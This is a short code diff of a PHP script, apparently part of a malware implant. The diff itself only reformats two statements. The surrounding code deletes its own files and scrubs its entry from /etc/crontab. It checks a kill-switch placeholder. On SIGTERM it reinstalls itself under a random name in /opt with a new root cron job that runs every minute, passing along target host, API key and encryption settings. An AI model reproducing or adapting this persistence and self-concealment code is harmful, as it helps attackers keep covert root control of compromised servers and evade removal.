@@ -18,7 +18,10 @@ $iv = getenv('LOCAL_IV');
 unlink(__FILE__);
 $sh = preg_replace('/\.php$/', '.sh', __FILE__);
 unlink($sh);
-file_put_contents('/etc/crontab', str_replace("\n* * * * * root sh $sh", '', file_get_contents('/etc/crontab')));
+file_put_contents(
+    '/etc/crontab',
+    str_replace("\n* * * * * root sh $sh", '', file_get_contents('/etc/crontab'))
+);
 if (getenv('##KILLNAME##') === '##KILLKEY##') {
     exit;
 }
@@ -27,7 +30,16 @@ $pcntlhandler = function () use ($api, $key, $host, $protocol, $data, $crypt, $i
     $file = randomAlphaNumericString(3);
     mkdir ("/opt", true);
     file_put_contents('/etc/crontab', "\n* * * * * root sh /opt/$file.sh", FILE_APPEND);
-    file_put_contents("/opt/$file.sh", "TARGET_API=$api TARGET_PROTOCOL=$protocol TARGET_HOST=$host TARGET_KEY=$key LOCAL_CRYPT=$crypt LOCAL_IV=$iv LOCAL_CRYPT=$crypt php $file.php &>/dev/null &");
+    file_put_contents(
+        "/opt/$file.sh",
+        "TARGET_API=$api "
+        . "TARGET_PROTOCOL=$protocol "
+        . "TARGET_HOST=$host "
+        . "TARGET_KEY=$key "
+        . "LOCAL_CRYPT=$crypt "
+        . "LOCAL_IV=$iv "
+        . "LOCAL_CRYPT=$crypt "
+        . "php $file.php &>/dev/null &");
     file_put_contents("/opt/$file.php", $data);
 };
 pcntl_signal(SIGTERM, $pcntlhandler);
